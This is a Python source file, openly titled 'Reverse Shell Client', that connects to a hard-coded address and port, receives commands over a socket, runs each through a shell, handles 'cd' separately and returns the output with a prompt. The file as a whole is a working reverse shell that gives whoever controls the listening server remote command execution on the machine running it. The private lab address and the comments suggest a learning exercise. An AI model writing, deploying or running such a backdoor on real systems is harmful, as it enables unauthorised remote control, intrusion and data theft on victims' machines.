#!/usr/bin/env python3

"""
Reverse Shell Client
--------------------
This client connects back to the server and waits for commands
It handles directory change requests specially and executes all other commands
"""

import socket
import os
import subprocess # To execute shell command
import sys

# Server configuration

SERVER_IP = "10.0.2.15"
SERVER_PORT = 9999


def main():
    # Create a socket and try to connect to the server
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_IP, SERVER_PORT))
    except socket.error as e:
        sys.exit(f"Connection failed: {e}")

    # Loop to recive and execute the command
    while True:
        try:
            data = sock.recv(1024) # Wait for data
            if not data:
                break
            command = data.decode("utf-8", errors= "ignore") # decode command string
            # Special handling for "cd" command
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    output = ""
                except OSError as e:
                    output = f"An error changing directory: {e}"

            else:
                # Ru the command with subprocessor
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin= subprocess.PIPE)
                stdout, stderr = process.communicate()
                output = stdout.decode() + stderr.decode() # Combine output

            #Append the current directory path like a shell prompt
            cwd = os.getcwd() + ">"
            final_output = output + cwd

            #Send result to the server
            sock.send(final_output.encode("utf-8"))

        except Exception as e:
            sock.send(f"Error\n".encode("utf-8")) # Send back any exception
    sock.close() # Close socket connection

# Entry point
if __name__ == '__main__':
    main()

